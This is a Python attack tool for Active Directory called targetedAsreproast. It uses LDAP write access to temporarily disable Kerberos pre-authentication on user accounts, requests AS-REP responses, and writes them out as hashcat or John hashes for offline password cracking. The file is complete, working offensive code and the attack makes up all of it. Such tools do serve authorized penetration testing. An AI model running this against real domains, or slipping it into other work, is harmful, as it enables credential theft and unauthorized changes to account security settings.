#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: gzzcoo
# Credits: https://github.com/ShutdownRepo/targetedKerberoast/tree/main
# File name: targetedAsreproast.py

import argparse, sys
import os
import ssl
import traceback
from binascii import hexlify, unhexlify

import ldap3
from pyasn1.codec.der import decoder
from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REP
from impacket.krb5.types import Principal
from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import getKerberosTGT
from impacket.spnego import SPNEGO_NegTokenInit, TypesMech
from impacket.smbconnection import SMBConnection

from rich.console import Console


def get_machine_name(dc_ip, domain):
    if dc_ip is not None:
        s = SMBConnection(dc_ip, dc_ip)
    else:
        s = SMBConnection(domain, domain)
    try:
        s.login('', '')
    except Exception:
        if s.getServerName() == '':
            raise Exception('Error while anonymous logging into %s' % domain)
    else:
        s.logoff()
    return s.getServerName()


def ldap3_kerberos_login(connection, target, user, password, domain='', lmhash='', nthash='', aes_key='', kdcHost=None,
                         TGT=None, TGS=None, useCache=True):
    from pyasn1.codec.ber import encoder, decoder
    from pyasn1.type.univ import noValue
    """
    logins into the target system explicitly using Kerberos. Hashes are used if RC4_HMAC is supported.
    :param string user: username
    :param string password: password for the user
    :param string domain: domain where the account is valid for (required)
    :param string lmhash: LMHASH used to authenticate using hashes (password is not used)
    :param string nthash: NTHASH used to authenticate using hashes (password is not used)
    :param string aes_key: aes256-cts-hmac-sha1-96 or aes128-cts-hmac-sha1-96 used for Kerberos authentication
    :param string kdcHost: hostname or IP Address for the KDC. If None, the domain will be used (it needs to resolve tho)
    :param struct TGT: If there's a TGT available, send the structure here and it will be used
    :param struct TGS: same for TGS. See smb3.py for the format
    :param bool useCache: whether or not we should use the ccache for credentials lookup. If TGT or TGS are specified this is False
    :return: True, raises an Exception if error.
    """

    if lmhash != '' or nthash != '':
        if len(lmhash) % 2:
            lmhash = '0' + lmhash
        if len(nthash) % 2:
            nthash = '0' + nthash
        try:  # just in case they were converted already
            lmhash = unhexlify(lmhash)
            nthash = unhexlify(nthash)
        except TypeError:
            pass

    if user is None:
        user = ""

    # Importing down here so pyasn1 is not required if kerberos is not used.
    from impacket.krb5.ccache import CCache
    from impacket.krb5.asn1 import AP_REQ, Authenticator, TGS_REP, seq_set
    from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
    from impacket.krb5 import constants
    from impacket.krb5.types import Principal, KerberosTime, Ticket
    import datetime

    if TGT is not None or TGS is not None or aes_key is not None:
        useCache = False

    if useCache:
        try:
            ccache = CCache.loadFile(os.getenv('KRB5CCNAME'))
        except Exception as e:
            pass
        else:
            # retrieve domain information from CCache file if needed
            if domain == '':
                domain = ccache.principal.realm['data'].decode('utf-8')
                logger.debug('Domain retrieved from CCache: %s' % domain)

            logger.debug('Using Kerberos Cache: %s' % os.getenv('KRB5CCNAME'))
            principal = 'ldap/%s@%s' % (target.upper(), domain.upper())

            creds = ccache.getCredential(principal)
            if creds is None:
                # Let's try for the TGT and go from there
                principal = 'krbtgt/%s@%s' % (domain.upper(), domain.upper())
                creds = ccache.getCredential(principal)
                if creds is not None:
                    TGT = creds.toTGT()
                    logger.debug('Using TGT from cache')
                else:
                    logger.debug('No valid credentials found in cache')
            else:
                TGS = creds.toTGS(principal)
                logger.debug('Using TGS from cache')

            # retrieve user information from CCache file if needed
            if user == '' and creds is not None:
                user = creds['client'].prettyPrint().split(b'@')[0].decode('utf-8')
                logger.debug('Username retrieved from CCache: %s' % user)
            elif user == '' and len(ccache.principal.components) > 0:
                user = ccache.principal.components[0]['data'].decode('utf-8')
                logger.debug('Username retrieved from CCache: %s' % user)

    # First of all, we need to get a TGT for the user
    userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    if TGT is None:
        if TGS is None:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, password, domain, lmhash, nthash,
                                                                    aes_key, kdcHost)
    else:
        tgt = TGT['KDC_REP']
        cipher = TGT['cipher']
        sessionKey = TGT['sessionKey']

    if TGS is None:
        serverName = Principal('ldap/%s' % target, type=constants.PrincipalNameType.NT_SRV_INST.value)
        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, kdcHost, tgt, cipher,
                                                                sessionKey)
    else:
        tgs = TGS['KDC_REP']
        cipher = TGS['cipher']
        sessionKey = TGS['sessionKey']

        # Let's build a NegTokenInit with a Kerberos REQ_AP

    blob = SPNEGO_NegTokenInit()

    # Kerberos
    blob['MechTypes'] = [TypesMech['MS KRB5 - Microsoft Kerberos 5']]

    # Let's extract the ticket from the TGS
    tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
    ticket = Ticket()
    ticket.from_asn1(tgs['ticket'])

    # Now let's build the AP_REQ
    apReq = AP_REQ()
    apReq['pvno'] = 5
    apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

    opts = []
    apReq['ap-options'] = constants.encodeFlags(opts)
    seq_set(apReq, 'ticket', ticket.to_asn1)

    authenticator = Authenticator()
    authenticator['authenticator-vno'] = 5
    authenticator['crealm'] = domain
    seq_set(authenticator, 'cname', userName.components_to_asn1)
    now = datetime.datetime.now(datetime.timezone.utc)

    authenticator['cusec'] = now.microsecond
    authenticator['ctime'] = KerberosTime.to_asn1(now)

    encodedAuthenticator = encoder.encode(authenticator)

    # Key Usage 11
    # AP-REQ Authenticator (includes application authenticator
    # subkey), encrypted with the application session key
    # (Section 5.5.1)
    encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 11, encodedAuthenticator, None)

    apReq['authenticator'] = noValue
    apReq['authenticator']['etype'] = cipher.enctype
    apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

    blob['MechToken'] = encoder.encode(apReq)

    request = ldap3.operation.bind.bind_operation(connection.version, ldap3.SASL, user, None, 'GSS-SPNEGO',
                                                  blob.getData())

    # Done with the Kerberos saga, now let's get into LDAP
    if connection.closed:  # try to open connection if closed
        connection.open(read_server_info=False)

    connection.sasl_in_progress = True
    response = connection.post_send_single_response(connection.send('bindRequest', request, None))
    connection.sasl_in_progress = False
    if response[0]['result'] != 0:
        raise Exception(response)

    connection.bound = True

    return True




def init_ldap_connection(target, tls_version, use_kerberos, domain, username, password, lmhash="", nthash=""):
    user = '%s\\%s' % (domain, username)
    connect_to = target
    if args.dc_ip is not None:
        connect_to = args.dc_ip
    if tls_version is not None:
        use_ssl = True
        port = 636
        tls = ldap3.Tls(validate=ssl.CERT_NONE, version=tls_version)
    else:
        use_ssl = False
        port = 389
        tls = None
    ldap_server = ldap3.Server(connect_to, get_info=ldap3.ALL, port=port, use_ssl=use_ssl, tls=tls)
    if use_kerberos:
        ldap_session = ldap3.Connection(ldap_server)
        ldap_session.bind()
        ldap3_kerberos_login(ldap_session, target, username, password, domain, lmhash, nthash, args.auth_aes_key, kdcHost=args.dc_ip)
    elif lmhash != "" and nthash != "":
        ldap_session = ldap3.Connection(ldap_server, user=user, password=lmhash + ":" + nthash, authentication=ldap3.NTLM, auto_bind=True)
    else:
        ldap_session = ldap3.Connection(ldap_server, user=user, password=password, authentication=ldap3.NTLM, auto_bind=True)

    return ldap_server, ldap_session


def init_ldap_session(use_kerberos, use_ldaps, dc_ip, domain, username, password, lmhash, nthash):
    if use_kerberos and not args.dc_host:
        target = get_machine_name(dc_ip, domain)
    else:
        if use_kerberos:
            target = args.dc_host
        else:
            if dc_ip is not None:
                target = args.dc_ip
            else:
                target = domain

    if use_ldaps is True:
        try:
            return init_ldap_connection(target, ssl.PROTOCOL_TLSv1_2, use_kerberos, domain, username, password, lmhash, nthash)
        except ldap3.core.exceptions.LDAPSocketOpenError:
            return init_ldap_connection(target, ssl.PROTOCOL_TLSv1, use_kerberos, domain, username, password, lmhash, nthash)
    else:
        return init_ldap_connection(target, None, use_kerberos, domain, username, password, lmhash, nthash)


def get_users(ldap_session, domain, usernames=None):
    if domain is None or "." not in domain:
        logger.error("FQDN Domain is needed to fetch domain information from LDAP")
        exit(0)
    else:
        domain_dn = ",".join(["DC=" + part for part in domain.split(".")])

    # Building the search filter
    filter_person = "objectCategory=person"
    filter_not_disabled = "!(userAccountControl:1.2.840.113556.1.4.803:=2)"

    search_filters = "(&"
    search_filters += "(" + filter_person + ")"
    search_filters += "(" + filter_not_disabled + ")"
    if usernames is not None:
        search_filters += '(|' + ''.join(["(sAMAccountName:=%s)" % u for u in usernames]) + ')'
    search_filters += ')'

    # we want username and attempts left for each account
    attributes = ["samAccountName", "userAccountControl", "distinguishedName"]

    try:
        ldap_session.search(search_base=domain_dn, search_filter=search_filters, attributes=attributes, size_limit=100000)
    except Exception as e:
        if 'sizeLimitExceeded' in e:
            logger.debug('sizeLimitExceeded exception caught, giving up and processing the data received')
            # We reached the sizeLimit, process the answers we have already and that's it. Until we implement paged queries
            pass
        else:
            raise

    users = {}
    for item in ldap_session.response:
        if "attributes" in item.keys():
            if "sAMAccountName" in item["attributes"].keys():
                sAMAccountName = item["attributes"]["sAMAccountName"]
                # following check is because tests have shown that with a Kerberos auth, results are sent in a list while str with NTLM auth (wtf?)
                if type(sAMAccountName) == list:
                    sAMAccountName = sAMAccountName[0]
                users[sAMAccountName] = {}
            if "distinguishedName" in item["attributes"].keys():
                distinguishedName = item["attributes"]["distinguishedName"]
                users[sAMAccountName]["dn"] = distinguishedName
            if "userAccountControl" in item["attributes"].keys():
                users[sAMAccountName]["uac"] = item["attributes"].get("userAccountControl", 0)
    return users


def obtain_asrep_hash(sAMAccountName, target_domain, kdc_host):
    try:
        client = Principal(sAMAccountName, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        tgt, _, _, _ = getKerberosTGT(client, '', target_domain, b'', b'', kdcHost=kdc_host,
                                      kerberoast_no_preauth=True)
        as_rep = decoder.decode(tgt, asn1Spec=AS_REP())[0]
        etype = int(as_rep['enc-part']['etype'])
        cipher = as_rep['enc-part']['cipher'].asOctets()
        if etype in (17, 18):
            if args.output_format == 'john':
                return '$krb5asrep$%d$%s%s$%s$%s' % (
                    etype, target_domain, sAMAccountName,
                    hexlify(cipher[:-12]).decode(), hexlify(cipher[-12:]).decode())
            return '$krb5asrep$%d$%s$%s$%s$%s' % (
                etype, sAMAccountName, target_domain,
                hexlify(cipher[-12:]).decode(), hexlify(cipher[:-12]).decode())
        if args.output_format == 'john':
            return '$krb5asrep$%s@%s:%s$%s' % (
                sAMAccountName, target_domain, hexlify(cipher[:16]).decode(), hexlify(cipher[16:]).decode())
        return '$krb5asrep$%d$%s@%s:%s$%s' % (
            etype, sAMAccountName, target_domain,
            hexlify(cipher[:16]).decode(), hexlify(cipher[16:]).decode())
    except Exception as e:
        if args.verbosity >= 1:
            traceback.print_exc()
        logger.debug("Exception: %s" % e)
        logger.error('Principal: %s - %s' % (sAMAccountName, str(e)))


def read_uac(ldap_session, dn):
    if not ldap_session.search(dn, '(objectClass=*)', attributes=['userAccountControl']) or not ldap_session.entries:
        raise Exception('Could not read userAccountControl for %s' % dn)
    return int(ldap_session.entries[0]['userAccountControl'].value)


def set_uac_bit(ldap_session, dn, enabled):
    current = read_uac(ldap_session, dn)
    updated = (current | 0x400000) if enabled else (current & ~0x400000)
    if updated == current:
        return
    ldap_session.modify(dn, {'userAccountControl': [ldap3.MODIFY_REPLACE, [updated]]})
    if ldap_session.result['result'] != 0:
        raise Exception('LDAP UAC update failed: %s' % ldap_session.result)

def handle_result(filename, result, user):
    if result is not None:
        # Keep targetedKerberoast's output convention for John mode.
        if args.output_format == 'john':
            result = user + ':' + result
        if filename is not None and filename != '':
            if len(os.path.dirname(filename)) != 0:
                if not os.path.exists(os.path.dirname(filename)):
                    os.makedirs(os.path.dirname(filename), exist_ok=True)
            if not os.path.exists(filename):
                open(filename, "w").close()
            with open(filename, 'a') as f:
                logger.success("Writing hash to file for (%s)" % user)
                f.write(result.strip() + "\n")
        else:
            logger.success("Printing hash for (%s)" % user)
            print(result)


class Logger(object):
    def __init__(self, verbosity=0, quiet=False):
        self.verbosity = verbosity
        self.quiet = quiet

    def debug(self, message):
        if self.verbosity >= 2:
            console.print("{}[DEBUG]{} {}".format("[yellow3]", "[/yellow3]", message), highlight=False)

    def verbose(self, message):
        if self.verbosity >= 1:
            console.print("{}[VERBOSE]{} {}".format("[blue]", "[/blue]", message), highlight=False)

    def info(self, message):
        if not self.quiet:
            console.print("{}[*]{} {}".format("[bold blue]", "[/bold blue]", message), highlight=False)

    def success(self, message):
        if not self.quiet:
            console.print("{}[+]{} {}".format("[bold green]", "[/bold green]", message), highlight=False)

    def warning(self, message):
        if not self.quiet:
            console.print("{}[-]{} {}".format("[bold orange3]", "[/bold orange3]", message), highlight=False)

    def error(self, message):
        if not self.quiet:
            console.print("{}[!]{} {}".format("[bold red]", "[/bold red]", message), highlight=False)


def parse_args():
    parser = argparse.ArgumentParser(description = "Temporarily sets DONT_REQ_PREAUTH and requests AS-REP hashes for target accounts")
    parser.add_argument("-v", "--verbose", dest="verbosity", action="count", default=0, help="verbosity level (-v for verbose, -vv for debug)")
    parser.add_argument("-q", "--quiet", dest="quiet", action="store_true", default=False, help="show no information at all")
    parser.add_argument('-D', '--target-domain', action='store', help='Domain to request AS-REPs from when it differs from the authentication domain (for trusted domains).')
    parser.add_argument('-U', '--users-file', help='File with user per line to test')
    parser.add_argument('--request-user', action='store', metavar='username', help='Requests an AS-REP for the specified username')
    parser.add_argument('-o', '--output-file', action='store', help='Output file for AS-REP hashes')
    parser.add_argument('-f', '--output-format', action='store', choices=['hashcat', 'john'], default='hashcat', help='Output format (default is "hashcat", "john" prepends usernames)')
    parser.add_argument('--use-ldaps', action='store_true', help='Use LDAPS instead of LDAP')
    parser.add_argument('--only-abuse', action='store_true', help='Only target accounts without DONT_REQ_PREAUTH already set')
    parser.add_argument('--no-abuse', action='store_true', help='Do not modify UAC; request AS-REPs only for accounts already configured without pre-authentication')
    parser.add_argument('--dc-host', action='store', help='Hostname of the target, can be used if port 445 is blocked or if NTLM is disabled')


    authconn = parser.add_argument_group('authentication & connection')
    authconn.add_argument('--dc-ip', action='store', metavar="ip address", help='IP Address of the domain controller or KDC (Key Distribution Center) for Kerberos. If omitted it will use the domain part (FQDN) specified in the identity parameter')
    authconn.add_argument("-d", "--domain", dest="auth_domain", metavar="DOMAIN", action="store", help="(FQDN) domain to authenticate to")
    authconn.add_argument("-u", "--user", dest="auth_username", metavar="USER", action="store", help="user to authenticate with")

    secret = parser.add_argument_group('secrets')
    secret.add_argument("-k", "--kerberos", dest="use_kerberos", action="store_true", help='Use Kerberos authentication. Grabs credentials from .ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line')
    cred = secret.add_mutually_exclusive_group()
    cred.add_argument('--no-pass', action="store_true", help="don't ask for password (useful for -k)")
    cred.add_argument("-p", "--password", dest="auth_password", metavar="PASSWORD", action="store", help="password to authenticate with")
    cred.add_argument("-H", "--hashes", dest="auth_hashes", action="store", metavar="[LMHASH:]NTHASH", help='NT/LM hashes, format is LMhash:NThash')
    cred.add_argument('--aes-key', dest="auth_aes_key", action="store", metavar="hex key", help='AES key to use for Kerberos Authentication (128 or 256 bits)')

    args = parser.parse_args()

    if args.no_abuse and args.only_abuse:
        parser.error("can't set --no-abuse and --only-abuse, it's counterintuitive")

    if args.use_kerberos == False and args.auth_aes_key is None and args.auth_hashes is None and args.auth_password is None and args.auth_username is None:
        parser.error("need to set credentials")

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    return args

def main_asreproast():
    ldap_session = None
    try:
        logger.info("Starting targeted AS-REPRoast attacks")
        lm_hash = nt_hash = ""
        if args.auth_hashes:
            parts = args.auth_hashes.split(":", 1)
            lm_hash, nt_hash = (parts[0], parts[1]) if len(parts) == 2 else ("", parts[0])
            lm_hash = lm_hash or "aad3b435b51404eeaad4b435b51404ee"
            nt_hash = nt_hash or "31d6cfe0d16ae931b73c59d7e0c089c0"

        use_kerb = args.use_kerberos or args.auth_aes_key is not None
        _, ldap_session = init_ldap_session(use_kerb, args.use_ldaps, args.dc_ip,
                                            args.auth_domain, args.auth_username,
                                            args.auth_password, lm_hash, nt_hash)
        if args.request_user:
            users = get_users(ldap_session, args.auth_domain, [args.request_user])
        elif args.users_file:
            with open(args.users_file, "r") as user_file:
                names = [line.strip() for line in user_file if line.strip()]
            users = get_users(ldap_session, args.auth_domain, names)
        else:
            users = get_users(ldap_session, args.auth_domain)

        domain = args.target_domain or args.auth_domain
        for username, details in users.items():
            dn = details.get('dn')
            if not dn:
                logger.warning('Skipping %s: LDAP did not return a distinguishedName' % username)
                continue
            try:
                original_uac = read_uac(ldap_session, dn)
            except Exception as read_error:
                logger.warning('Skipping %s: could not read userAccountControl: %s' % (username, read_error))
                continue
            flag_was_set = bool(original_uac & 0x400000)
            if args.only_abuse and flag_was_set:
                continue
            if flag_was_set:
                handle_result(args.output_file, obtain_asrep_hash(username, domain, args.dc_ip), username)
                continue
            if args.no_abuse:
                continue

            changed = False
            try:
                set_uac_bit(ldap_session, dn, True)
                changed = True
                logger.info('Setting DONT_REQ_PREAUTH temporarily for (%s)' % username)
                handle_result(args.output_file, obtain_asrep_hash(username, domain, args.dc_ip), username)
            except Exception as target_error:
                # Match targetedKerberoast: insufficient rights are expected per-object and debug-only.
                ldap_code = (ldap_session.result or {}).get('result')
                if ldap_code == 50:
                    logger.debug('Could not modify (%s), the server reports insufficient rights' % username)
                elif ldap_code == 19:
                    logger.error('Could not modify (%s), the server reports a constrained violation' % username)
                else:
                    logger.warning('Skipping %s: %s' % (username, target_error))
            finally:
                if changed:
                    try:
                        set_uac_bit(ldap_session, dn, False)
                        logger.verbose('DONT_REQ_PREAUTH removed for (%s)' % username)
                    except Exception as cleanup_error:
                        logger.error('CRITICAL: failed to restore UAC for %s: %s' % (username, cleanup_error))
        ldap_session.unbind()
    except Exception as e:
        logger.error(str(e))
        if args.verbosity >= 1:
            traceback.print_exc()
        if ldap_session is not None and ldap_session.bound:
            ldap_session.unbind()


if __name__ == '__main__':
    args = parse_args()
    logger = Logger(args.verbosity, args.quiet)
    console = Console()
    main_asreproast()
